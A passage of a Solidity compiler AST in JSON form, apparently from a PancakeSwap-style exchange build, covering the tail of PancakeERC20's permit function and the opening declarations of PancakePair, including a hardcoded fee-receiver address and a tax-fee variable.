																	"id": 415,
																	"name": "recoveredAddress",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 406,
																	"src": "4322:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 417,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "4350:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			}
																		],
																		"id": 416,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "4342:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": "address"
																	},
																	"id": 418,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "4342:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"src": "4322:30:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"id": 422,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 420,
																	"name": "recoveredAddress",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 406,
																	"src": "4356:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "==",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 421,
																	"name": "owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 358,
																	"src": "4376:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"src": "4356:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "4322:59:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e56414c49445f5349474e4154555245",
															"id": 424,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4395:28:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_861fe3f25593eb07d57a38fb1b6b0f761f16eb1611a0df03954a734d69fb97bf",
																"typeString": "literal_string \"Pancake: INVALID_SIGNATURE\""
															},
															"value": "Pancake: INVALID_SIGNATURE"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_861fe3f25593eb07d57a38fb1b6b0f761f16eb1611a0df03954a734d69fb97bf",
																"typeString": "literal_string \"Pancake: INVALID_SIGNATURE\""
															}
														],
														"id": 414,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "4301:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 425,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4301:132:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 426,
												"nodeType": "ExpressionStatement",
												"src": "4301:132:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 428,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 358,
															"src": "4452:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 429,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 360,
															"src": "4459:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 430,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 362,
															"src": "4468:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 427,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 230,
														"src": "4443:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 431,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4443:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 432,
												"nodeType": "ExpressionStatement",
												"src": "4443:31:0"
											}
										]
									},
									"documentation": null,
									"id": 434,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "permit",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 371,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 358,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3542:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 357,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3542:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 360,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3565:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 359,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3565:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 362,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3590:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 361,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3590:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 364,
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3613:16:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 363,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3613:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 366,
												"name": "v",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3639:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 365,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "3639:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 368,
												"name": "r",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3656:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 367,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "3656:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 370,
												"name": "s",
												"nodeType": "VariableDeclaration",
												"scope": 434,
												"src": "3675:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 369,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "3675:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3532:158:0"
									},
									"returnParameters": {
										"id": 372,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3700:0:0"
									},
									"scope": 435,
									"src": "3517:964:0",
									"stateMutability": "nonpayable",
									"superFunction": 1915,
									"visibility": "external"
								}
							],
							"scope": 436,
							"src": "139:4344:0"
						}
					],
					"src": "36:4448:0"
				},
				"id": 0
			},
			"src/exchange-protocol/contracts/PancakePair.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/PancakePair.sol",
					"exportedSymbols": {
						"PancakePair": [
							1700
						]
					},
					"id": 1701,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 437,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:1"
						},
						{
							"absolutePath": "src/exchange-protocol/contracts/interfaces/IPancakePair.sol",
							"file": "./interfaces/IPancakePair.sol",
							"id": 438,
							"nodeType": "ImportDirective",
							"scope": 1701,
							"sourceUnit": 2236,
							"src": "62:39:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/exchange-protocol/contracts/PancakeERC20.sol",
							"file": "./PancakeERC20.sol",
							"id": 439,
							"nodeType": "ImportDirective",
							"scope": 1701,
							"sourceUnit": 436,
							"src": "102:28:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/exchange-protocol/contracts/libraries/Math.sol",
							"file": "./libraries/Math.sol",
							"id": 440,
							"nodeType": "ImportDirective",
							"scope": 1701,
							"sourceUnit": 2312,
							"src": "131:30:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/exchange-protocol/contracts/libraries/UQ112x112.sol",
							"file": "./libraries/UQ112x112.sol",
							"id": 441,
							"nodeType": "ImportDirective",
							"scope": 1701,
							"sourceUnit": 2429,
							"src": "162:35:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/exchange-protocol/contracts/interfaces/IERC20.sol",
							"file": "./interfaces/IERC20.sol",
							"id": 442,
							"nodeType": "ImportDirective",
							"scope": 1701,
							"sourceUnit": 1785,
							"src": "198:33:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/exchange-protocol/contracts/interfaces/IPancakeFactory.sol",
							"file": "./interfaces/IPancakeFactory.sol",
							"id": 443,
							"nodeType": "ImportDirective",
							"scope": 1701,
							"sourceUnit": 1985,
							"src": "232:42:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/exchange-protocol/contracts/interfaces/IPancakeCallee.sol",
							"file": "./interfaces/IPancakeCallee.sol",
							"id": 444,
							"nodeType": "ImportDirective",
							"scope": 1701,
							"sourceUnit": 1799,
							"src": "275:41:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 445,
										"name": "IPancakePair",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2235,
										"src": "342:12:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IPancakePair_$2235",
											"typeString": "contract IPancakePair"
										}
									},
									"id": 446,
									"nodeType": "InheritanceSpecifier",
									"src": "342:12:1"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 447,
										"name": "PancakeERC20",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 435,
										"src": "356:12:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_PancakeERC20_$435",
											"typeString": "contract PancakeERC20"
										}
									},
									"id": 448,
									"nodeType": "InheritanceSpecifier",
									"src": "356:12:1"
								}
							],
							"contractDependencies": [
								435,
								1916,
								2235
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1700,
							"linearizedBaseContracts": [
								1700,
								435,
								1916,
								2235
							],
							"name": "PancakePair",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 451,
									"libraryName": {
										"contractScope": null,
										"id": 449,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2386,
										"src": "381:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$2386",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "375:24:1",
									"typeName": {
										"id": 450,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "394:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"id": 454,
									"libraryName": {
										"contractScope": null,
										"id": 452,
										"name": "UQ112x112",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2428,
										"src": "410:9:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_UQ112x112_$2428",
											"typeString": "library UQ112x112"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "404:28:1",
									"typeName": {
										"id": 453,
										"name": "uint224",
										"nodeType": "ElementaryTypeName",
										"src": "424:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint224",
											"typeString": "uint224"
										}
									}
								},
								{
									"constant": false,
									"id": 457,
									"name": "FeeResiver",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "438:70:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 455,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "438:7:1",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "307833353862423135313541343161383033614439353044334130643232423931343039334464423830",
										"id": 456,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "466:42:1",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_address_payable",
											"typeString": "address payable"
										},
										"value": "0x358bB1515A41a803aD950D3A0d22B914093DdB80"
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 462,
									"name": "MINIMUM_LIQUIDITY",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "515:48:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 458,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "515:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"commonType": {
											"typeIdentifier": "t_rational_1000_by_1",
											"typeString": "int_const 1000"
										},
										"id": 461,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"lValueRequested": false,
										"leftExpression": {
											"argumentTypes": null,
											"hexValue": "3130",
											"id": 459,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "556:2:1",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_10_by_1",
												"typeString": "int_const 10"
											},
											"value": "10"
										},
										"nodeType": "BinaryOperation",
										"operator": "**",
										"rightExpression": {
											"argumentTypes": null,
											"hexValue": "33",
											"id": 460,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "562:1:1",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_3_by_1",
												"typeString": "int_const 3"
											},
											"value": "3"
										},
										"src": "556:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_1000_by_1",
											"typeString": "int_const 1000"
										}
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 471,
									"name": "SELECTOR",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "569:96:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes4",
										"typeString": "bytes4"
									},
									"typeName": {
										"id": 463,
										"name": "bytes4",
										"nodeType": "ElementaryTypeName",
										"src": "569:6:1",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"arguments": [
													{
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"hexValue": "7472616e7366657228616464726573732c75696e7432353629",
																"id": 467,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "635:27:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_a9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b",
																	"typeString": "literal_string \"transfer(address,uint256)\""
																},
																"value": "transfer(address,uint256)"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_a9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b",
																	"typeString": "literal_string \"transfer(address,uint256)\""
																}
															],
															"id": 466,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "629:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																"typeString": "type(bytes storage pointer)"
															},
															"typeName": "bytes"
														},
														"id": 468,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "629:34:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													}
												],
												"expression": {
													"argumentTypes": [
														{
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													],
													"id": 465,
													"name": "keccak256",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 2437,
													"src": "619:9:1",
													"typeDescriptions": {
														"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
														"typeString": "function (bytes memory) pure returns (bytes32)"
													}
												},
												"id": 469,
												"isConstant": false,
												"isLValue": false,
												"isPure": true,
												"kind": "functionCall",
												"lValueRequested": false,
												"names": [],
												"nodeType": "FunctionCall",
												"src": "619:45:1",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												}
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												}
											],
											"id": 464,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"lValueRequested": false,
											"nodeType": "ElementaryTypeNameExpression",
											"src": "612:6:1",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_bytes4_$",
												"typeString": "type(bytes4)"
											},
											"typeName": "bytes4"
										},
										"id": 470,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "typeConversion",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "612:53:1",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 473,
									"name": "factory",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "672:22:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 472,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "672:7:1",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 475,
									"name": "token0",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "700:21:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 474,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "700:7:1",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 477,
									"name": "token1",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "727:21:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 476,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "727:7:1",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 479,
									"name": "taxfee",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "754:18:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 478,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "754:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 481,
									"name": "reserve0",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "779:24:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint112",
										"typeString": "uint112"
									},
									"typeName": {
										"id": 480,
										"name": "uint112",
										"nodeType": "ElementaryTypeName",
										"src": "779:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint112",
											"typeString": "uint112"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 483,
									"name": "reserve1",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "865:24:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint112",
										"typeString": "uint112"
									},
									"typeName": {
										"id": 482,
										"name": "uint112",
										"nodeType": "ElementaryTypeName",
										"src": "865:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint112",
											"typeString": "uint112"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 485,
									"name": "blockTimestampLast",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "951:33:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint32",
										"typeString": "uint32"
									},
									"typeName": {
										"id": 484,
										"name": "uint32",
										"nodeType": "ElementaryTypeName",
										"src": "951:6:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint32",
											"typeString": "uint32"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 487,
									"name": "price0CumulativeLast",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "1047:32:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 486,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "1047:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 489,
									"name": "price1CumulativeLast",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "1085:32:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 488,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "1085:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 491,
									"name": "kLast",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "1123:17:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 490,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "1123:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 494,
									"name": "unlocked",
									"nodeType": "VariableDeclaration",
									"scope": 1700,
									"src": "1227:25:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 492,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "1227:4:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "31",
										"id": 493,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "1251:1:1",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_1_by_1",
											"typeString": "int_const 1"
										},
										"value": "1"
									},
									"visibility": "private"
								},
								{
									"body": {
										"id": 512,
										"nodeType": "Block",
										"src": "1274:113:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 499,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 497,
																"name": "unlocked",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 494,
																"src": "1292:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 498,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1304:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1_by_1",
																	"typeString": "int_const 1"
																},
																"value": "1"
															},
															"src": "1292:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a204c4f434b4544",
															"id": 500,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1307:17:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c084a590425edfe86a11f73831c0243820669c7e4ae4ddc8e665ae7ef10c474a",
																"typeString": "literal_string \"Pancake: LOCKED\""
															},
															"value": "Pancake: LOCKED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c084a590425edfe86a11f73831c0243820669c7e4ae4ddc8e665ae7ef10c474a",
